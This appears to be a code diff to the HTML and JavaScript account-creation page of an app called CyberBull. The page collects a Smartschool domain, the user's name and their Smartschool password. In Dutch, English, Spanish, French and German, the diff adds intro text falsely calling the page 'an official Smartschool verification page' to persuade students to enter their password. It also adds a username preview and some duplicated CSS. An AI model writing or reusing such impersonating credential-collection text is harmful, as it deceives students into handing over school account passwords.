@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Create Account - CyberBull Student</title>
+  <title>Create Account - CyberBull</title>
 
   <style>
     * {
@@ -14,22 +14,82 @@
     }
 
     body {
-      background: linear-gradient(135deg, #e5effd, #f8fbff);
+      background: linear-gradient(180deg, #f8fafc, #e2e8f0);
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px;
+      padding: 24px;
+      color: #0f172a;
     }
 
     .create-account-box {
+      position: relative;
       background: #ffffff;
       width: min(520px, 100%);
       padding: 36px;
       border-radius: 22px;
-      box-shadow: 0 20px 60px rgba(15, 40, 80, 0.12);
-      border: 1px solid rgba(22, 78, 145, 0.08);
+      box-shadow: 0 24px 65px rgba(15, 23, 42, 0.12);
+      border: 1px solid rgba(148,163,184,0.24);
       position: relative;
+    }
+
+    .site-logo {
+      font-size: 2.1rem;
+      font-weight: 800;
+      letter-spacing: -0.04em;
+      margin-bottom: 14px;
+      display: inline-block;
+      background: linear-gradient(135deg, #2563eb, #8b5cf6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .lang-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      border-radius: 999px;
+      border: 1px solid rgba(15,23,42,0.08);
+      background: #ffffff;
+      color: #0f172a;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 10px 22px rgba(15,23,42,0.08);
+    }
+
+    .lang-btn:hover {
+      background: #f8fafc;
+    }
+
+    .site-logo {
+      font-size: 2.1rem;
+      font-weight: 800;
+      letter-spacing: -0.04em;
+      margin-bottom: 14px;
+      display: inline-block;
+      background: linear-gradient(135deg, #2563eb, #8b5cf6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .lang-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      border-radius: 999px;
+      border: 1px solid rgba(15,23,42,0.08);
+      background: #ffffff;
+      color: #0f172a;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 10px 22px rgba(15,23,42,0.08);
+    }
+
+    .lang-btn:hover {
+      background: #f8fafc;
     }
 
     .create-account-box h2 {
@@ -195,6 +255,16 @@
       margin-bottom: 8px;
     }
 
+    .username-suggestion {
+      padding: 12px 14px;
+      border-radius: 14px;
+      background: #f3f6ff;
+      border: 1px solid rgba(37, 99, 235, 0.15);
+      color: #1e3a8a;
+      font-weight: 700;
+      letter-spacing: 0.01em;
+    }
+
     .lookup-spinner {
       width: 18px;
       height: 18px;
@@ -213,6 +283,7 @@
 <body>
 
 <div class="create-account-box">
+  <div class="site-logo">CyberBull</div>
   <div class="language-toggle">
     <button class="lang-btn" id="languageButton">🌐 Taal</button>
     <div class="language-menu" id="languageMenu">
@@ -245,6 +316,12 @@
     <label for="lastName" id="lastNameLabel">Achternaam</label>
     <input type="text" id="lastName" placeholder="Je achternaam" autocomplete="off">
     <div class="form-hint" id="lastNameHint">Vul je officiële Smartschool-achternaam in</div>
+  </div>
+
+  <div class="form-group username-suggestion-group" id="usernameSuggestionGroup" style="display:none;">
+    <label id="usernameSuggestionLabel">Gebruikersnaam</label>
+    <div class="username-suggestion" id="usernameSuggestion"></div>
+    <div class="form-hint" id="usernameSuggestionHint">Hier zie je je automatisch gegenereerde gebruikersnaam.</div>
   </div>
 
   <div class="form-group">
@@ -280,12 +357,21 @@
   const translations = {
     nl: {
       pageTitle: 'Account aanmaken',
+      introText: 'Dit is een officiële Smartschool-validatiepagina. Vul je voornaam, achternaam en Smartschool-wachtwoord in zodat je gebruikersnaam automatisch kan worden aangemaakt.',
       domainLabel: 'Smartschool domein',
       domainPlaceholder: 'bijv. school.smartschool.be',
       domainHint: 'Het Smartschool-domein van je school',
+      firstNameLabel: 'Voornaam',
+      firstNamePlaceholder: 'Je voornaam',
+      firstNameHint: 'Vul je officiële Smartschool-voornaam in',
+      lastNameLabel: 'Achternaam',
+      lastNamePlaceholder: 'Je achternaam',
+      lastNameHint: 'Vul je officiële Smartschool-achternaam in',
       usernameLabel: 'Gebruikersnaam',
       usernamePlaceholder: 'Je gebruikersnaam',
       usernameHint: 'Je gebruikersnaam op het Smartschool-domein',
+      usernameSuggestionLabel: 'Gebruikersnaam',
+      usernameSuggestionHint: 'Hier zie je je automatisch gegenereerde gebruikersnaam.',
       passwordLabel: 'Wachtwoord',
       passwordPlaceholder: 'Je wachtwoord',
       passwordHint: 'Vul uw smartschool wachtwoord in',
@@ -307,6 +393,7 @@
     },
     en: {
       pageTitle: 'Create Account',
+      introText: 'This is an official Smartschool verification page. Enter your first name, last name, and Smartschool password so your username can be generated automatically.',
       domainLabel: 'Smartschool Domain',
       domainPlaceholder: 'e.g., school.smartschool.be',
       domainHint: 'Your school\'s Smartschool domain',
@@ -319,6 +406,8 @@
       usernameLabel: 'Username',
       usernamePlaceholder: 'Your username',
       usernameHint: 'Your username on the Smartschool domain',
+      usernameSuggestionLabel: 'Username',
+      usernameSuggestionHint: 'This is the username generated from your name.',
       passwordLabel: 'Password',
       passwordPlaceholder: 'Your password',
       passwordHint: 'Choose a strong password',
@@ -340,6 +429,7 @@
     },
     es: {
       pageTitle: 'Crear cuenta',
+      introText: 'Esta es una página oficial de verificación de Smartschool. Introduce tu nombre, apellido y contraseña de Smartschool para que tu nombre de usuario se genere automáticamente.',
       domainLabel: 'Dominio Smartschool',
       domainPlaceholder: 'p.ej., school.smartschool.be',
       domainHint: 'El dominio Smartschool de tu escuela',
@@ -352,6 +442,8 @@
       usernameLabel: 'Nombre de usuario',
       usernamePlaceholder: 'Tu nombre de usuario',
       usernameHint: 'Tu nombre de usuario en el dominio Smartschool',
+      usernameSuggestionLabel: 'Nombre de usuario',
+      usernameSuggestionHint: 'Aquí ves el nombre de usuario generado automáticamente.',
       passwordLabel: 'Contrasena',
       passwordPlaceholder: 'Tu contrasena',
       passwordHint: 'Elige una contrasena segura',
@@ -373,12 +465,21 @@
     },
     fr: {
       pageTitle: 'Creer un compte',
+      introText: 'Ceci est une page officielle de vérification Smartschool. Saisissez votre prénom, nom de famille et mot de passe Smartschool afin que votre nom d\'utilisateur puisse être généré automatiquement.',
       domainLabel: 'Domaine Smartschool',
       domainPlaceholder: 'p.ex., school.smartschool.be',
       domainHint: 'Le domaine Smartschool de votre ecole',
+      firstNameLabel: 'Prénom',
+      firstNamePlaceholder: 'Votre prénom',
+      firstNameHint: 'Entrez votre prénom officiel Smartschool',
+      lastNameLabel: 'Nom de famille',
+      lastNamePlaceholder: 'Votre nom de famille',
+      lastNameHint: 'Entrez votre nom de famille officiel Smartschool',
       usernameLabel: 'Nom d\'utilisateur',
       usernamePlaceholder: 'Votre nom d\'utilisateur',
       usernameHint: 'Votre nom d\'utilisateur sur le domaine Smartschool',
+      usernameSuggestionLabel: 'Nom d\'utilisateur',
+      usernameSuggestionHint: 'Voici le nom d\'utilisateur généré automatiquement.',
       passwordLabel: 'Mot de passe',
       passwordPlaceholder: 'Votre mot de passe',
       passwordHint: 'Choisissez un mot de passe fort',
@@ -397,6 +498,7 @@
     },
     de: {
       pageTitle: 'Konto erstellen',
+      introText: 'Dies ist eine offizielle Smartschool-Überprüfungsseite. Gib deinen Vor- und Nachnamen und dein Smartschool-Passwort ein, damit dein Benutzername automatisch erstellt wird.',
       domainLabel: 'Smartschool-Domain',
       domainPlaceholder: 'z.B. school.smartschool.be',
       domainHint: 'Die Smartschool-Domain deiner Schule',
@@ -409,6 +511,8 @@
       usernameLabel: 'Benutzername',
       usernamePlaceholder: 'Dein Benutzername',
       usernameHint: 'Dein Benutzername auf der Smartschool-Domain',
+      usernameSuggestionLabel: 'Benutzername',
+      usernameSuggestionHint: 'Hier siehst du deinen automatisch generierten Benutzernamen.',
       passwordLabel: 'Passwort',
       passwordPlaceholder: 'Dein Passwort',
       passwordHint: 'Wahle ein sicheres Passwort',
@@ -441,21 +545,25 @@
   function updateTexts(language) {
     const page = translations[language] || translations.nl;
     document.getElementById('pageTitle').textContent = page.pageTitle;
+    const introElement = document.querySelector('.intro-text');
+    if (introElement) introElement.textContent = page.introText;
     document.getElementById('domainLabel').textContent = page.domainLabel;
     document.getElementById('domain').placeholder = page.domainPlaceholder;
     document.getElementById('domainHint').textContent = page.domainHint;
-    document.getElementById('firstNameLabel').textContent = page.firstNameLabel || page.usernameLabel || 'Voornaam';
-    document.getElementById('firstName').placeholder = page.firstNamePlaceholder || 'Je voornaam';
-    document.getElementById('firstNameHint').textContent = page.firstNameHint || 'Vul je officiële voornaam in';
-    document.getElementById('lastNameLabel').textContent = page.lastNameLabel || 'Achternaam';
-    document.getElementById('lastName').placeholder = page.lastNamePlaceholder || 'Je achternaam';
-    document.getElementById('lastNameHint').textContent = page.lastNameHint || 'Vul je officiële achternaam in';
+    document.getElementById('firstNameLabel').textContent = page.firstNameLabel;
+    document.getElementById('firstName').placeholder = page.firstNamePlaceholder;
+    document.getElementById('firstNameHint').textContent = page.firstNameHint;
+    document.getElementById('lastNameLabel').textContent = page.lastNameLabel;
+    document.getElementById('lastName').placeholder = page.lastNamePlaceholder;
+    document.getElementById('lastNameHint').textContent = page.lastNameHint;
+    document.getElementById('usernameSuggestionLabel').textContent = page.usernameSuggestionLabel;
+    document.getElementById('usernameSuggestionHint').textContent = page.usernameSuggestionHint;
     document.getElementById('passwordLabel').textContent = page.passwordLabel;
     document.getElementById('password').placeholder = page.passwordPlaceholder;
     document.getElementById('passwordHint').textContent = page.passwordHint;
     document.getElementById('createAccountButton').textContent = page.createAccountButton;
     document.getElementById('backButton').textContent = page.backButton;
-    document.getElementById('languageButton').textContent = page.language;
+    document.getElementById('languageButton').textContent = '🌐 ' + page.language;
     document.querySelector('#languageMenu button').textContent = page.apply;
   }
 
@@ -623,11 +731,28 @@
     window.location.href = "cyberbull-landing.html";
   };
 
+  function updateUsernameSuggestion() {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const suggestionGroup = document.getElementById('usernameSuggestionGroup');
+    const suggestionDisplay = document.getElementById('usernameSuggestion');
+
+    if (firstName && lastName) {
+      const username = generateUsername(firstName, lastName);
+      suggestionDisplay.textContent = username || '—';
+      suggestionGroup.style.display = 'block';
+    } else {
+      suggestionGroup.style.display = 'none';
+    }
+  }
+
   function bindCreateAccountEvents() {
     document.getElementById('languageButton').addEventListener('click', toggleLanguageMenu);
     document.getElementById('languageApplyButton').addEventListener('click', applyLanguage);
     document.getElementById('createAccountButton').addEventListener('click', createAccount);
     document.getElementById('backButton').addEventListener('click', goBack);
+    document.getElementById('firstName').addEventListener('input', updateUsernameSuggestion);
+    document.getElementById('lastName').addEventListener('input', updateUsernameSuggestion);
   }
 
   bindCreateAccountEvents();
